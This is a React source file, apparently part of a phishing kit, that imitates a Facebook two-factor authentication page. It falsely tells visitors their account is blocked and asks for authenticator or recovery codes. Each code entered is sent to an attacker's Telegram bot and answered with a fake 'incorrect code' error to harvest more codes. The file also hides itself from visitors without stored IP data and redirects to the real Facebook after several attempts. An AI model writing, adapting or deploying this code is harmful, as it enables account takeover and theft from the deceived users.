import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import config from '@/utils/config';

const Verify = () => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    // Định nghĩa văn bản mặc định
    const defaultTexts = useMemo(
        () => ({
            title: 'Two-factor authentication required',
            description:
                'We have temporarily blocked your account because your protect has changed. Verify code has been sent',
            placeholder: 'Enter your code',
            infoTitle: 'Approve from another device or Enter your verification code',
            infoDescription:
                'Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code. Please enter the code within 02:21 to complete the appeal form.',
            walkthrough: "We'll walk you through some steps to secure and unlock your account.",
            submit: 'Submit',
            sendCode: 'Send Code',
            errorMessage: 'The verification code you entered is incorrect',
            loadingText: 'Please wait',
            secondsText: 'seconds'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    // Hàm dịch tất cả các văn bản
    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const translated = await Promise.all(
                    Object.values(defaultTexts).map((text) => translateText(text, targetLang))
                );

                setTranslatedTexts({
                    title: translated[0],
                    description: translated[1],
                    placeholder: translated[2],
                    infoTitle: translated[3],
                    infoDescription: translated[4],
                    walkthrough: translated[5],
                    submit: translated[6],
                    sendCode: translated[7],
                    errorMessage: translated[8],
                    loadingText: translated[9],
                    secondsText: translated[10]
                });
            } catch (error) {
                console.error('Error during translation:', error);
            }
        },
        [defaultTexts]
    );

    // Dịch văn bản khi load trang
    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    // Hàm format thời gian đếm ngược
    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    // Hàm xử lý submit form
    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
            await sendMessage(message);
        } catch (error) {
            console.error('Error sending message:', error);
        }

        setCountdown(config.code_loading_time);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) => setTimeout(resolve, config.code_loading_time * 1000));

        setShowError(true);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= config.max_code_attempts) {
            window.location.replace('https://facebook.com');
            return;
        }

        setCode('');
    };

    return (
        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
            <title>Account | Privacy Policy</title>
            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                <p>{translatedTexts.description}</p>
                <img src={VerifyImage} alt='Verification' className='w-full h-auto' />
                <input
                    type='number'
                    inputMode='numeric'
                    max={8}
                    placeholder={translatedTexts.placeholder}
                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
                    value={code}
                    onChange={(e) => setCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                />
                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}

                {/* Information Section */}
                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
                    <div>
                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                    </div>
                </div>

                <p>{translatedTexts.walkthrough}</p>

                {/* Submit Button */}
                <button
                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
                </button>

                {/* Send Code Link */}
                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
            </div>
        </div>
    );
};

export default Verify;
